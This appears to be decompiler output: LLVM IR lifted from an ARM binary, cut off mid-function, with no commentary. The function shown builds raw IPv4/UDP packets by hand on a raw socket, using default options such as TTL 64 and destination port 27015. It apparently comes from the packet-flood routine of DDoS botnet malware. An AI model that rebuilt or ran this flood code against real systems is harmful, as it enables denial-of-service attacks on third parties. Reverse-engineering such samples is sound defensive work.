  %v1_e41c = trunc i32 %v0_e41c to i8
  %v2_e41c = load i32, i32* %r1.global-to-local, align 4
  %v3_e41c = inttoptr i32 %v2_e41c to i8*
  store i8 %v1_e41c, i8* %v3_e41c, align 1
  store i32 %v4_e420, i32* %r0.global-to-local, align 4
  %v2_e424 = load i32, i32* %r1.global-to-local, align 4
  %v3_e424 = add i32 %v2_e424, 1
  %v4_e424 = inttoptr i32 %v3_e424 to i8*
  store i8 %v5_de78, i8* %v4_e424, align 1
  %v2_e42c = load i32, i32* %r1.global-to-local, align 4
  %v3_e42c = add i32 %v2_e42c, 8
  %v4_e42c = inttoptr i32 %v3_e42c to i8*
  store i8 %v5_deb0, i8* %v4_e42c, align 1
  %v3_e430 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e430, i32* %r2.global-to-local, align 4
  %v3_e434 = mul i32 %v3_e430, 32
  store i32 %v3_e434, i32* %r3.global-to-local, align 4
  %v0_e438 = load i32, i32* @fp, align 4
  %v1_e438 = load i32, i32* %r1.global-to-local, align 4
  %v2_e438 = add i32 %v1_e438, 12
  %v3_e438 = inttoptr i32 %v2_e438 to i32*
  store i32 %v0_e438, i32* %v3_e438, align 4
  %v0_e43c = load i32, i32* %r3.global-to-local, align 4
  %v1_e43c = load i32, i32* %r2.global-to-local, align 4
  %tmp69 = mul i32 %v1_e43c, -8
  %v5_e43c = add i32 %v0_e43c, %tmp69
  store i32 %v3_e3b0, i32* %ip.global-to-local, align 4
  %v1_e444 = load i32, i32* @r8, align 4
  %v2_e444 = add i32 %v1_e444, %v5_e43c
  store i32 %v2_e444, i32* %r3.global-to-local, align 4
  %v1_e448 = add i32 %v2_e444, 16
  %v2_e448 = inttoptr i32 %v1_e448 to i32*
  %v3_e448 = load i32, i32* %v2_e448, align 4
  store i32 %v3_e448, i32* %r0.global-to-local, align 4
  %v2_e44c = load i32, i32* %r1.global-to-local, align 4
  %v3_e44c = add i32 %v2_e44c, 2
  %v4_e44c = inttoptr i32 %v3_e44c to i8*
  store i8 %v5_e050, i8* %v4_e44c, align 1
  store i32 %v3_e3b8, i32* %ip.global-to-local, align 4
  %v0_e454 = load i32, i32* %r2.global-to-local, align 4
  %v1_e454 = add i32 %v0_e454, 1
  store i32 %v1_e454, i32* %r4.global-to-local, align 4
  store i32 %v1_de14, i32* %r3.global-to-local, align 4
  store i32 %v7_e3b0, i32* %r2.global-to-local, align 4
  %v0_e460 = load i32, i32* %r0.global-to-local, align 4
  %v1_e460 = load i32, i32* %r1.global-to-local, align 4
  %v2_e460 = add i32 %v1_e460, 16
  %v3_e460 = inttoptr i32 %v2_e460 to i32*
  store i32 %v0_e460, i32* %v3_e460, align 4
  store i32 %v3_e3b4, i32* %r0.global-to-local, align 4
  %v0_e468 = load i32, i32* %ip.global-to-local, align 4
  %v1_e468 = trunc i32 %v0_e468 to i8
  %v2_e468 = load i32, i32* %r1.global-to-local, align 4
  %v3_e468 = add i32 %v2_e468, 5
  %v4_e468 = inttoptr i32 %v3_e468 to i8*
  store i8 %v1_e468, i8* %v4_e468, align 1
  store i32 %v4_e46c, i32* %ip.global-to-local, align 4
  %v0_e470 = load i32, i32* %r0.global-to-local, align 4
  %v1_e470 = trunc i32 %v0_e470 to i8
  %v2_e470 = load i32, i32* %r1.global-to-local, align 4
  %v3_e470 = add i32 %v2_e470, 3
  %v4_e470 = inttoptr i32 %v3_e470 to i8*
  store i8 %v1_e470, i8* %v4_e470, align 1
  %v0_e474 = load i32, i32* %r2.global-to-local, align 4
  %v1_e474 = trunc i32 %v0_e474 to i8
  %v2_e474 = load i32, i32* %r1.global-to-local, align 4
  %v3_e474 = add i32 %v2_e474, 4
  %v4_e474 = inttoptr i32 %v3_e474 to i8*
  store i8 %v1_e474, i8* %v4_e474, align 1
  %v0_e478 = load i32, i32* %r4.global-to-local, align 4
  %v1_e478 = load i32, i32* %r3.global-to-local, align 4
  %v9_e478 = icmp eq i32 %v0_e478, %v1_e478
  store i1 %v9_e478, i1* %cpsr_z.global-to-local, align 1
  store i32 64, i32* %r0.global-to-local, align 4
  %v0_e480 = load i32, i32* %r1.global-to-local, align 4
  %v1_e480 = add i32 %v0_e480, 20
  store i32 %v1_e480, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_e488 = add i32 %v0_e480, 6
  %v4_e488 = inttoptr i32 %v3_e488 to i8*
  store i8 64, i8* %v4_e488, align 1
  %v0_e48c = load i32, i32* %r2.global-to-local, align 4
  %v1_e48c = trunc i32 %v0_e48c to i8
  %v2_e48c = load i32, i32* %r1.global-to-local, align 4
  %v3_e48c = add i32 %v2_e48c, 7
  %v4_e48c = inttoptr i32 %v3_e48c to i8*
  store i8 %v1_e48c, i8* %v4_e48c, align 1
  %v0_e490 = load i32, i32* %r5.global-to-local, align 4
  %v1_e490 = trunc i32 %v0_e490 to i8
  %v2_e490 = load i32, i32* %r1.global-to-local, align 4
  %v3_e490 = add i32 %v2_e490, 20
  %v4_e490 = inttoptr i32 %v3_e490 to i8*
  store i8 %v1_e490, i8* %v4_e490, align 1
  %v0_e494 = load i32, i32* %r7.global-to-local, align 4
  %v1_e494 = trunc i32 %v0_e494 to i8
  %v2_e494 = load i32, i32* %r3.global-to-local, align 4
  %v3_e494 = add i32 %v2_e494, 5
  %v4_e494 = inttoptr i32 %v3_e494 to i8*
  store i8 %v1_e494, i8* %v4_e494, align 1
  %v0_e498 = load i32, i32* %ip.global-to-local, align 4
  %v1_e498 = trunc i32 %v0_e498 to i8
  %v2_e498 = load i32, i32* %r3.global-to-local, align 4
  %v3_e498 = add i32 %v2_e498, 1
  %v4_e498 = inttoptr i32 %v3_e498 to i8*
  store i8 %v1_e498, i8* %v4_e498, align 1
  %v0_e49c = load i32, i32* %r6.global-to-local, align 4
  %v1_e49c = trunc i32 %v0_e49c to i8
  %v2_e49c = load i32, i32* %r3.global-to-local, align 4
  %v3_e49c = add i32 %v2_e49c, 2
  %v4_e49c = inttoptr i32 %v3_e49c to i8*
  store i8 %v1_e49c, i8* %v4_e49c, align 1
  %v0_e4a0 = load i32, i32* %sl.global-to-local, align 4
  %v1_e4a0 = trunc i32 %v0_e4a0 to i8
  %v2_e4a0 = load i32, i32* %r3.global-to-local, align 4
  %v3_e4a0 = add i32 %v2_e4a0, 3
  %v4_e4a0 = inttoptr i32 %v3_e4a0 to i8*
  store i8 %v1_e4a0, i8* %v4_e4a0, align 1
  %v0_e4a4 = load i32, i32* %sb.global-to-local, align 4
  %v1_e4a4 = trunc i32 %v0_e4a4 to i8
  %v2_e4a4 = load i32, i32* %r3.global-to-local, align 4
  %v3_e4a4 = add i32 %v2_e4a4, 4
  %v4_e4a4 = inttoptr i32 %v3_e4a4 to i8*
  store i8 %v1_e4a4, i8* %v4_e4a4, align 1
  %v0_e4a8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e4a8, i32* %stack_var_-40, align 4
  %v5_e4ac = icmp slt i32 %v0_e478, %v1_e478
  br i1 %v5_e4ac, label %dec_label_pc_e3d8, label %dec_label_pc_e158.preheader

; uselistorder directives
  uselistorder i32 %v3_e3b8, { 1, 0 }
  uselistorder i32 %v3_e3b4, { 1, 0 }
  uselistorder i32 %v7_e3b0, { 1, 0 }
  uselistorder i32 %v3_e3b0, { 1, 0 }
  uselistorder i32 %v1_e3a4, { 1, 0 }
  uselistorder i32 %v4_e354, { 1, 0 }
  uselistorder i32 %v0_e34c, { 0, 2, 1 }
  uselistorder i32 %v0_e330, { 0, 2, 1 }
  uselistorder i32 %v2_e2e8, { 1, 0 }
  uselistorder i32 %v8_e2cc, { 1, 2, 0, 3 }
  uselistorder i32 %v3_e2b8, { 1, 0 }
  uselistorder i32 %v3_e294, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_e260, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v4_e204, { 0, 2, 1 }
  uselistorder i32 %v0_e1ec, { 1, 0, 2, 3 }
  uselistorder i32 %v4_e1d8, { 1, 0 }
  uselistorder i32 %v2_e1d4, { 0, 2, 1 }
  uselistorder i1 %v7_e184, { 1, 0 }
  uselistorder i1 %v9_e308, { 2, 3, 1, 0 }
  uselistorder i32 %v1_e0f4, { 1, 0 }
  uselistorder i8 %v5_e054, { 0, 2, 1 }
  uselistorder i8 %v5_e050, { 0, 2, 1 }
  uselistorder i32 %v1_e04c, { 2, 3, 0, 1 }
  uselistorder i32 %v3_e038, { 1, 0 }
  uselistorder i32 %v1_e024, { 1, 0 }
  uselistorder i32 %v1_e008, { 1, 2, 0 }
  uselistorder i32 %v1_e004, { 2, 3, 1, 0 }
  uselistorder i32 %v1_e000, { 3, 4, 0, 2, 1 }
  uselistorder i1 %v2_dfe4, { 1, 0, 2, 3 }
  uselistorder i32 %v3_dfd8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_dfcc, { 1, 0, 3, 2 }
  uselistorder i32 %v0_dfbc, { 0, 4, 5, 6, 3, 7, 8, 1, 2 }
  uselistorder i32 %v3_dfb0, { 3, 1, 2, 0 }
  uselistorder i1 %v7_df9c, { 1, 0 }
  uselistorder i1 %v7_df70, { 1, 0 }
  uselistorder i32 %v3_df6c, { 3, 4, 1, 5, 6, 2, 0, 7 }
  uselistorder i32 %v2_df58, { 2, 1, 0 }
  uselistorder i32 %v1_df34, { 3, 1, 2, 0 }
  uselistorder i32 %v6_ded8, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_dec0, { 1, 0 }
  uselistorder i8 %v5_deb0, { 0, 2, 1 }
  uselistorder i32 %v6_de94, { 1, 0 }
  uselistorder i32 %v7_de7c, { 0, 2, 1, 4, 3, 5 }
  uselistorder i8 %v5_de78, { 1, 0, 3, 2 }
  uselistorder i32 %v6_de58, { 1, 0 }
  uselistorder i32 %v4_de40, { 0, 3, 1, 5, 2, 4 }
  uselistorder i32 %v1_de14, { 6, 2, 3, 4, 1, 5, 9, 0, 7, 8 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 15, 13, 14 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 2, 4, 5, 3 }
  uselistorder i32* %sb.global-to-local, { 5, 0, 1, 6, 7, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 2, 0, 3, 4, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 10, 8, 9, 11, 12, 13, 14, 15, 16, 17, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 26, 27, 28, 29, 30, 31, 32, 33, 40, 34, 35, 36, 37, 38, 39, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 27, 28, 29, 35, 30, 31, 32, 33, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 13, 9, 10, 11, 12, 14, 15, 16, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 17, 18, 19, 20, 21, 23, 22, 24, 25, 27, 26, 29, 28, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 9, 8, 11, 10, 13, 30, 29, 31, 33, 34, 32, 36, 35, 38, 37, 39, 28, 40, 1, 41, 42, 43, 44, 45, 46, 47, 51, 48, 49, 50, 12, 14, 16, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 6, 7, 8, 9, 10, 11, 12, 13, 20, 14, 15, 16, 17, 18, 19, 21, 22, 23, 2, 3, 4, 5 }
  uselistorder i32 240, { 1, 0 }
  uselistorder label %dec_label_pc_e398, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e368, { 1, 0 }
  uselistorder label %dec_label_pc_e1c4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e158, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
}

define i32 @function_e4b8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_e4b8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_e4b8 = load i32, i32* @r4, align 4
  %v6_e4b8 = load i32, i32* @r5, align 4
  %v9_e4b8 = load i32, i32* @r6, align 4
  %v12_e4b8 = load i32, i32* @r7, align 4
  %v15_e4b8 = load i32, i32* @r8, align 4
  %v1_e4bc = urem i32 %arg2, 256
  store i32 0, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  %v1_e4d8 = urem i32 %arg4, 256
  store i32 %v1_e4d8, i32* @r4, align 4
  store i32 %arg5, i32* @r5, align 4
  store i32 %arg3, i32* @sl, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v2_e4e8 = call i32* @calloc(i32 %v1_e4bc, i32 4)
  %v3_e4e8 = ptrtoint i32* %v2_e4e8 to i32
  %v0_e4ec = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_e4f4 = load i32, i32* @r7, align 4
  store i32 %v0_e4f4, i32* %r3.global-to-local, align 4
  store i32 %v3_e4e8, i32* %fp.global-to-local, align 4
  %v0_e4fc = load i32, i32* @r4, align 4
  %v4_e500 = inttoptr i32 %v0_e4ec to i32*
  %v5_e500 = call i32 @function_ad24(i32 %v0_e4fc, i32* %v4_e500, i32 2, i32 %v0_e4f4)
  %v1_e50c = urem i32 %v5_e500, 256
  store i32 %v1_e50c, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_e518 = load i32, i32* @r4, align 4
  %v0_e51c = load i32, i32* @r5, align 4
  %v5_e520 = trunc i32 %v5_e500 to i8
  %v6_e524 = inttoptr i32 %v0_e51c to i32*
  %v7_e524 = call i32 @function_ad24(i32 %v0_e518, i32* %v6_e524, i32 3, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1))
  %v0_e528 = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_e534 = load i32, i32* @r4, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_e53c = inttoptr i32 %v0_e528 to i32*
  %v6_e53c = call i32 @function_ad24(i32 %v0_e534, i32* %v5_e53c, i32 4, i32 64)
  %v1_e544 = urem i32 %v6_e53c, 256
  store i32 %v1_e544, i32* %ip.global-to-local, align 4
  %v0_e548 = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v0_e550 = load i32, i32* @r7, align 4
  store i32 %v0_e550, i32* %r3.global-to-local, align 4
  %v0_e554 = load i32, i32* @r4, align 4
  %v6_e55c = inttoptr i32 %v0_e548 to i32*
  %v7_e55c = call i32 @function_ad24(i32 %v0_e554, i32* %v6_e55c, i32 5, i32 %v0_e550)
  %v1_e568 = urem i32 %v7_e55c, 256
  store i32 %v1_e568, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_e574 = load i32, i32* @r4, align 4
  %v0_e578 = load i32, i32* @r5, align 4
  %v5_e580 = inttoptr i32 %v0_e578 to i32*
  %v6_e580 = call i32 @function_ad24(i32 %v0_e574, i32* %v5_e580, i32 6, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1))
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_e590 = load i32, i32* @r5, align 4
  store i32 %v6_e580, i32* @r8, align 4
  %v0_e598 = load i32, i32* @r4, align 4
  %v4_e59c = inttoptr i32 %v0_e590 to i32*
  %v5_e59c = call i32 @function_ad24(i32 %v0_e598, i32* %v4_e59c, i32 7, i32 27015)
  store i32 %v5_e59c, i32* @r4, align 4
  %v0_e5a4 = load i32, i32* @r7, align 4
  store i32 %v0_e5a4, i32* %stack_var_-44, align 4
  %v1_e5ac = inttoptr i32 %v0_e5a4 to i32*
  %v2_e5ac = call i32 @time(i32* %v1_e5ac)
  %v1_e5b0 = load i32, i32* @r6, align 4
  %v2_e5b0 = add i32 %v1_e5b0, %v2_e5ac
  %v1_e5bc = call i32 @function_12280(i32 36)
  %v3_e5c8 = call i32 @function_1219c(i32 36, i32* nonnull %stack_var_-44)
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_e5dc = call i32 @socket(i32 2, i32 3, i32 17)
  %v7_e5e0 = icmp eq i32 %v3_e5dc, -1
  store i1 %v7_e5e0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_e5dc, i32* %sb.global-to-local, align 4
  br i1 %v7_e5e0, label %dec_label_pc_e9a0, label %dec_label_pc_e5ec

dec_label_pc_e5ec:                                ; preds = %dec_label_pc_e4b8
  store i32 1, i32* %stack_var_-40, align 4
  %v6_e5f4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_e5f4, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_e5fc = load i32, i32* @r7, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_e608 = call i32 @setsockopt(i32 %v0_e5fc, i32 3, i32 %v6_e5f4, i32* nonnull %stack_var_-40, i32 ptrtoint (i32* @0 to i32))
  %v7_e60c = icmp eq i32 %v6_e608, -1
  store i1 %v7_e60c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e60c, label %dec_label_pc_e9a8, label %dec_label_pc_e614

dec_label_pc_e614:                                ; preds = %dec_label_pc_e5ec
  store i32 %v1_e4bc, i32* %r2.global-to-local, align 4
  %v0_e620 = load i32, i32* @r4, align 4
  %v3_e620 = mul i32 %v0_e620, 65536
  store i32 %v3_e620, i32* %lr.global-to-local, align 4
  %v0_e624 = load i32, i32* @r8, align 4
  %v3_e624 = mul i32 %v0_e624, 65536
  store i32 %v3_e624, i32* %ip.global-to-local, align 4
  %v3_e628 = urem i32 %v7_e524, 65536
  store i32 %v3_e628, i32* %r3.global-to-local, align 4
  %v3_e62c = urem i32 %v0_e624, 65536
  store i32 %v3_e62c, i32* %r4.global-to-local, align 4
  %v3_e630 = urem i32 %v0_e620, 65536
  %v2_e634 = icmp eq i32 %v1_e4bc, 0
  store i1 %v2_e634, i1* %cpsr_z.global-to-local, align 1
  %v0_e638 = load i32, i32* @r7, align 4
  store i32 %v0_e638, i32* %stack_var_-40, align 4
  br i1 %v2_e634, label %dec_label_pc_e98c.critedge, label %dec_label_pc_e64c

dec_label_pc_e64c:                                ; preds = %dec_label_pc_e614
  %v1_e650 = urem i32 %v7_e524, 256
  %v1_e654 = urem i32 %v0_e620, 256
  %tmp42 = udiv i32 %v7_e524, 256
  %v3_e65c = urem i32 %tmp42, 256
  %v3_e660 = mul nuw nsw i32 %v1_e654, 256
  store i32 %v3_e660, i32* %r3.global-to-local, align 4
  %v1_e664 = urem i32 %v0_e624, 256
  %v4_e668 = mul nuw nsw i32 %v1_e650, 256
  %v5_e668 = or i32 %v4_e668, %v3_e65c
  store i32 %v5_e668, i32* %r8.global-to-local, align 4
  %tmp43 = udiv i32 %v0_e624, 256
  %v3_e66c = urem i32 %tmp43, 256
  store i32 %v3_e66c, i32* %ip.global-to-local, align 4
  %tmp44 = udiv i32 %v0_e620, 256
  %v4_e670 = urem i32 %tmp44, 256
  %v5_e670 = or i32 %v4_e670, %v3_e660
  store i32 %v5_e670, i32* %r5.global-to-local, align 4
  %v4_e674 = mul nuw nsw i32 %v1_e664, 256
  %v5_e674 = or i32 %v4_e674, %v3_e66c
  store i32 %v5_e674, i32* %r6.global-to-local, align 4
  store i32 %v1_e654, i32* %r2.global-to-local, align 4
  store i32 %v0_e638, i32* %r4.global-to-local, align 4
  store i32 %v1_e664, i32* %r7.global-to-local, align 4
  %sext = mul i32 %v6_e53c, 16777216
  %v4_e6f0 = sdiv i32 %sext, 16777216
  %sext6 = mul i32 %v7_e524, 16777216
  %v4_e70c = sdiv i32 %sext6, 16777216
  %sext7 = mul i32 %v0_e620, 16777216
  %v4_e768 = sdiv i32 %sext7, 16777216
  %v2_e6f4 = icmp eq i32 %v1_e568, 0
  %v1_e6f8 = trunc i32 %v4_e6f0 to i8
  br label %dec_label_pc_e690

dec_label_pc_e690:                                ; preds = %bb48, %dec_label_pc_e64c
  %v2_e698 = call i32* @calloc(i32 128, i32 1)
  %v4_e698 = ptrtoint i32* %v2_e698 to i32
  %v3_e69c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e69c, i32* %r3.global-to-local, align 4
  %v1_e6a0 = load i32, i32* %fp.global-to-local, align 4
  %v2_e6a0 = load i32, i32* %r4.global-to-local, align 4
  %v5_e6a0 = mul i32 %v2_e6a0, 4
  %v6_e6a0 = add i32 %v5_e6a0, %v1_e6a0
  %v7_e6a0 = inttoptr i32 %v6_e6a0 to i32*
  store i32 %v4_e698, i32* %v7_e6a0, align 4
  %v0_e6a4 = load i32, i32* %fp.global-to-local, align 4
  %v1_e6a4 = load i32, i32* %r3.global-to-local, align 4
  %v4_e6a4 = mul i32 %v1_e6a4, 4
  %v5_e6a4 = add i32 %v4_e6a4, %v0_e6a4
  %v6_e6a4 = inttoptr i32 %v5_e6a4 to i32*
  %v7_e6a4 = load i32, i32* %v6_e6a4, align 4
  store i32 %v7_e6a4, i32* %lr.global-to-local, align 4
  %v1_e6a8 = inttoptr i32 %v7_e6a4 to i8*
  %v2_e6a8 = load i8, i8* %v1_e6a8, align 1
  %tmp = urem i8 %v2_e6a8, 16
  %v1_e6ac = zext i8 %tmp to i32
  %v1_e6b0 = or i32 %v1_e6ac, 64
  store i32 %v1_e6b0, i32* %r3.global-to-local, align 4
  %v1_e6b8 = trunc i32 %v1_e6b0 to i8
  store i8 %v1_e6b8, i8* %v1_e6a8, align 1
  %v0_e6bc = load i32, i32* %lr.global-to-local, align 4
  %v1_e6bc = inttoptr i32 %v0_e6bc to i8*
  %v2_e6bc = load i8, i8* %v1_e6bc, align 1
  %v1_e6c0 = and i8 %v2_e6bc, -16
  %v1_e6c4 = or i8 %v1_e6c0, 5
  store i8 %v1_e6c4, i8* %v1_e6bc, align 1
  %v2_e6d0 = load i32, i32* %lr.global-to-local, align 4
  %v3_e6d0 = add i32 %v2_e6d0, 1
  %v4_e6d0 = inttoptr i32 %v3_e6d0 to i8*
  store i8 %v5_e520, i8* %v4_e6d0, align 1
  %v3_e6d4 = load i32, i32* %stack_var_-44, align 4
  %v1_e6d8 = add i32 %v3_e6d4, 32
  %tmp45 = mul i32 %v1_e6d8, 256
  store i32 %v1_e568, i32* %r4.global-to-local, align 4
  %v1_e6e8 = and i32 %tmp45, 65280
  %tmp46 = udiv i32 %v1_e6d8, 256
  %v4_e6ec = urem i32 %tmp46, 256
  %v5_e6ec = or i32 %v4_e6ec, %v1_e6e8
  store i32 %v5_e6ec, i32* %r2.global-to-local, align 4
  store i32 %v4_e6f0, i32* %r3.global-to-local, align 4
  store i1 %v2_e6f4, i1* %cpsr_z.global-to-local, align 1
  %v2_e6f8 = load i32, i32* %lr.global-to-local, align 4
  %v3_e6f8 = add i32 %v2_e6f8, 8
  %v4_e6f8 = inttoptr i32 %v3_e6f8 to i8*
  store i8 %v1_e6f8, i8* %v4_e6f8, align 1
  %v0_e6fc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e6fc, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_e690
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_e700 = load i32, i32* %lr.global-to-local, align 4
  %v4_e700 = add i32 %v3_e700, 6
  %v5_e700 = inttoptr i32 %v4_e700 to i8*
  store i8 64, i8* %v5_e700, align 1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e690, %bb
  %v0_e708 = load i32, i32* %r2.global-to-local, align 4
  %v3_e708 = sdiv i32 %v0_e708, 256
  store i32 %v3_e708, i32* %ip.global-to-local, align 4
  store i32 %v4_e70c, i32* %r4.global-to-local, align 4
  %v2_e710 = load i32, i32* %lr.global-to-local, align 4
  %v3_e710 = add i32 %v2_e710, 9
  %v4_e710 = inttoptr i32 %v3_e710 to i8*
  store i8 17, i8* %v4_e710, align 1
  store i32 ptrtoint (i32* @global_var_1c21c.135 to i32), i32* %r3.global-to-local, align 4
  %v0_e718 = load i32, i32* %r2.global-to-local, align 4
  %v1_e718 = trunc i32 %v0_e718 to i8
  %v2_e718 = load i32, i32* %lr.global-to-local, align 4
  %v3_e718 = add i32 %v2_e718, 2
  %v4_e718 = inttoptr i32 %v3_e718 to i8*
  store i8 %v1_e718, i8* %v4_e718, align 1
  %v0_e71c = load i32, i32* %ip.global-to-local, align 4
  %v1_e71c = trunc i32 %v0_e71c to i8
  %v2_e71c = load i32, i32* %lr.global-to-local, align 4
  %v3_e71c = add i32 %v2_e71c, 3
  %v4_e71c = inttoptr i32 %v3_e71c to i8*
  store i8 %v1_e71c, i8* %v4_e71c, align 1
  %v0_e720 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e720, label %.thread8, label %bb47

.thread8:                                         ; preds = %.thread
  %v3_e7249 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e7249, i32* %ip.global-to-local, align 4
  br label %bb48

bb47:                                             ; preds = %.thread
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_e724 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e724, i32* %ip.global-to-local, align 4
  %v3_e728 = load i32, i32* %lr.global-to-local, align 4
  %v4_e728 = add i32 %v3_e728, 7
  %v5_e728 = inttoptr i32 %v4_e728 to i8*
  store i8 0, i8* %v5_e728, align 1
  %v0_e730.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %.thread8, %bb47
  %v0_e730 = phi i32 [ %v3_e7249, %.thread8 ], [ %v0_e730.pre, %bb47 ]
  %v2_e72c = load i32, i32* @global_var_1c21c.135, align 4
  store i32 %v2_e72c, i32* %r2.global-to-local, align 4
  %v3_e730 = mul i32 %v0_e730, 32
  store i32 %v3_e730, i32* %r3.global-to-local, align 4
  %v1_e734 = load i32, i32* %lr.global-to-local, align 4
  %v2_e734 = add i32 %v1_e734, 12
  %v3_e734 = inttoptr i32 %v2_e734 to i32*
  store i32 %v2_e72c, i32* %v3_e734, align 4
  %v0_e738 = load i32, i32* %r3.global-to-local, align 4
  %v1_e738 = load i32, i32* %ip.global-to-local, align 4
  %tmp53 = mul i32 %v1_e738, -8
  %v5_e738 = add i32 %v0_e738, %tmp53
  %v1_e73c = load i32, i32* @sl, align 4
  %v2_e73c = add i32 %v5_e738, %v1_e73c
  store i32 %v2_e73c, i32* %r3.global-to-local, align 4
  %v1_e740 = add i32 %v2_e73c, 16
  %v2_e740 = inttoptr i32 %v1_e740 to i32*
  %v3_e740 = load i32, i32* %v2_e740, align 4
  %v1_e744 = load i32, i32* %lr.global-to-local, align 4
  %v2_e744 = add i32 %v1_e744, 16
  %v3_e744 = inttoptr i32 %v2_e744 to i32*
  store i32 %v3_e740, i32* %v3_e744, align 4
  %v3_e748 = load i32, i32* %stack_var_-44, align 4
  %v1_e74c = add i32 %v3_e748, 12
  %tmp49 = mul i32 %v1_e74c, 256
  %v1_e75c = and i32 %tmp49, 65280
  %tmp50 = udiv i32 %v1_e74c, 256
  %v4_e760 = urem i32 %tmp50, 256
  %v5_e760 = or i32 %v4_e760, %v1_e75c
  store i32 %v5_e760, i32* %ip.global-to-local, align 4
  %v1_e764 = load i32, i32* %lr.global-to-local, align 4
  %v2_e764 = add i32 %v1_e764, 28
  %v3_e764 = inttoptr i32 %v2_e764 to i32*
  store i32 -1, i32* %v3_e764, align 4
  store i32 %v4_e768, i32* %r2.global-to-local, align 4
  %v0_e76c = load i32, i32* %r4.global-to-local, align 4
  %v1_e76c = trunc i32 %v0_e76c to i8
  %v2_e76c = load i32, i32* %lr.global-to-local, align 4
  %v3_e76c = add i32 %v2_e76c, 5
  %v4_e76c = inttoptr i32 %v3_e76c to i8*
  store i8 %v1_e76c, i8* %v4_e76c, align 1
  %v0_e770 = load i32, i32* %ip.global-to-local, align 4
  %v3_e770 = sdiv i32 %v0_e770, 256
  store i32 %v3_e770, i32* %r3.global-to-local, align 4
